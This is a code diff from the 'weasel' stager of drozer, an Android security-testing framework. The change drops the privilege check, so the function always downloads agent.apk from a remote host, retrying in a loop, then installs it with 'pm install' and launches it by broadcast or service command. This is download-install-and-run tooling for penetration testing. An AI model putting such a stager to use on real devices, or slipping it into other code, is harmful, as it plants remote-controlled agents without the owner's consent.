@@ -6,54 +6,39 @@ char *port;
 char *dir;
 
 
-/* Install a drozer apk if we are [root], [system], [shell] or have the INSTALL_PACKAGES permission */
+/* Attempt to install a drozer apk */
 bool privileged_weasel()
 {
-    /* Check user id of weasel */
-    int uid = geteuid();
+    /* Pull down the apk file from HTTP server and place in current folder - retry every 5s upon failure */
+    while (!downloadFile(ip, port, "agent.apk", dir))
+        sleep(5);
     
-    /* Determine whether we have privileged context */
-    bool privileged = ((uid == 0) || (uid == 1000) || (uid == 2000));
+    /* Attempt to install drozer */
+    const char* pmString = "pm install %s/agent.apk";
+    char* pmCommand = malloc(strlen(pmString) - 2 + strlen(dir) + 1);
+    sprintf(pmCommand, pmString, dir);
+    system(pmCommand);
+    
+    /* Get SDK version from SystemProperties */
+    char sdkVersionStr[4];
+    long sdkVersionLong;
+    property_get("ro.build.version.sdk", sdkVersionStr, NULL);
+    sdkVersionLong = strtol(sdkVersionStr, NULL, 10);
 
-    /* Speed optimisation to avoid this check if it is not necessary */
-    if (!privileged)
-        privileged = haveInstallPackages(uid);
-    
-    /* Download, install and start a full drozer if this weasel is privileged */
-    if (privileged)
+    /* Check if device is running Android 3.0.x or less */
+    if (sdkVersionLong <= 11)
     {
-        /* Pull down the apk file from HTTP server and place in current folder - retry every 5s upon failure */
-        while (!downloadFile(ip, port, "agent.apk", dir))
-            sleep(5);
-        
-        /* Install drozer */
-        const char* pmString = "pm install %s/agent.apk > /dev/null 2>&1";
-        char* pmCommand = malloc(strlen(pmString) - 2 + strlen(dir) + 1);
-        sprintf(pmCommand, pmString, dir);
-        system(pmCommand);
-        
-        /* Get SDK version from SystemProperties */
-        char sdkVersionStr[4];
-        long sdkVersionLong;
-        property_get("ro.build.version.sdk", sdkVersionStr, NULL);
-        sdkVersionLong = strtol(sdkVersionStr, NULL, 10);
-
-        /* Check if device is running Android 3.0.x or less */
-        if (sdkVersionLong <= 11)
-        {
-            /* Start drozer by sending a broadcast */
-            const char* amBroadcast = "am broadcast -a com.mwr.dz.PWN";
-            system(amBroadcast);
-            debug("weasel", "Starting method - sent broadcast");
-        }
-        else
-        {
-             /* Start drozer by invoking the service */
-            const char* amService = "am startservice -n com.mwr.dz/.Agent";
-            system(amService);
-            debug("weasel", "Starting method - invoked service");
-        }
-       
+        /* Start drozer by sending a broadcast */
+        const char* amBroadcast = "am broadcast -a com.mwr.dz.PWN";
+        system(amBroadcast);
+        debug("weasel", "Starting method - sent broadcast");
+    }
+    else
+    {
+         /* Start drozer by invoking the service */
+        const char* amService = "am startservice -n com.mwr.dz/.Agent";
+        system(amService);
+        debug("weasel", "Starting method - invoked service");
     }
     
     return drozerInstalled();
